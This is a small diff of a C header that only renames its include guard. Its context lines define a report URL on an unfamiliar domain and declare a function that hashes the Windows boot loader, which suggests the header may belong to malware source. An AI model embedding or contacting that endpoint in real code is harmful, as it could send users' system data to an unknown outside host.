@@ -1,5 +1,5 @@
-#ifndef UUID_E4500F5134534F79A3663021D13CDBC8
-#define UUID_E4500F5134534F79A3663021D13CDBC8
+#ifndef DbgRptH
+#define DbgRptH
 
 #define PP_REPORT_URL  "http://srgsgsg.info/geter/index_.php"
 
@@ -43,4 +43,4 @@ void DebugReportRunTests();
 
 char* CalcNtldrMd5(char* Buffer, DWORD BufferSize);
 
-#endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8
+#endif 
